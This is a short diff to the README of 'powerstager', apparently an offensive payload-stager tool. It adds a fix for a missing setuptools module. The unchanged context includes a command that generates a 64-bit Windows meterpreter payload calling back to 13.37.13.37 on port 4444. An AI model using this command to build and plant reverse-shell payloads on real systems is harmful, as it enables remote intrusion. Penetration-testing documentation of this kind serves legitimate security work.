@@ -25,7 +25,14 @@ Install it:
 	git clone https://github.com/z0noxz/powerstager
 	cd powerstager
 	sudo ./setup.py install
+	
 
+If error shows like: 
+ImportError: No module named 'setuptools'
+
+	sudo apt-get install python3-setuptools
+	
+	
 Generate a meterpreter payload to upload:
 
 	powerstager -t win64 -o out.ps1 -m --lhost 13.37.13.37 --lport 4444 --generate
